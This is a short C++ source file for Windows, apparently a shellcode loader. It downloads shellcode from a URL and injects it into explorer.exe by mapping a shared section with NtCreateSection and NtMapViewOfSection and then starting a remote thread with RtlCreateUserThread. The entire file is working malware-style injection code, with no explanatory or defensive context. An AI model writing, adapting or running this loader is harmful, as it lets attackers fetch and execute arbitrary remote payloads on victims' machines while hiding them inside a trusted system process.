#include "..\..\Public.hpp"
#include <winternl.h>

typedef struct { PVOID UniqueProcess; PVOID UniqueThread; } * PCLIENT_ID;
using pNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL);
using pNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
using pRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID ClientID);

#include <tlhelp32.h>

DWORD GetProcessId(const wchar_t* processName)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (Process32First(snapshot, &processEntry))
	{
		while (_wcsicmp(processEntry.szExeFile, processName) != 0)
		{
			Process32Next(snapshot, &processEntry);
		}
	}
	return processEntry.th32ProcessID;
}

void runShellcode()
{
	std::string shellcode = GetShellcodeFromUrl();

	pNtCreateSection fNtCreateSection = (pNtCreateSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateSection"));
	pNtMapViewOfSection fNtMapViewOfSection = (pNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));
	pRtlCreateUserThread fRtlCreateUserThread = (pRtlCreateUserThread)(GetProcAddress(GetModuleHandleA("ntdll"), "RtlCreateUserThread"));

	if (shellcode.size() > 0)
	{
		SIZE_T size = shellcode.size();
		LARGE_INTEGER sectionSize = { size };
		HANDLE sectionHandle = NULL;
		PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
		fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
		fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
		
		DWORD targetPID = GetProcessId(L"explorer.exe");
		HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetPID);
		fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);
		mc(localSectionAddress, shellcode.c_str(), shellcode.size());
		//3.Execute shellcode
		HANDLE targetThreadHandle = NULL;
		fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);

	}
}

int main()
{
	runShellcode();
	return 0;
}